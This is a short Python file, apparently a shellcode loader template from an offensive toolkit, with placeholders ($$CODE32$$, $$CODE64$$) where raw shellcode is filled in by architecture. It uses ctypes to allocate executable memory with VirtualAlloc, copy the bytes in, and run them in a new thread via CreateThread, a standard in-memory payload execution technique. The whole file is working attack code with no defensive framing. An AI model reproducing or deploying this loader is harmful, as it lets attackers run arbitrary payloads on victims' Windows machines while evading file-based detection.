import ctypes
import platform

(arch, type) = platform.architecture()

# 32-bit Python
if arch == "32bit":
	scbytes = b"$$CODE32$$"

# 64-bit Python
elif arch == "64bit":
	scbytes = b"$$CODE64$$" 
else:
	scbytes = ""

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 

space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(scbytes)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buff = ( ctypes.c_char * len(scbytes) ).from_buffer_copy( scbytes )
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(scbytes)))
handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)



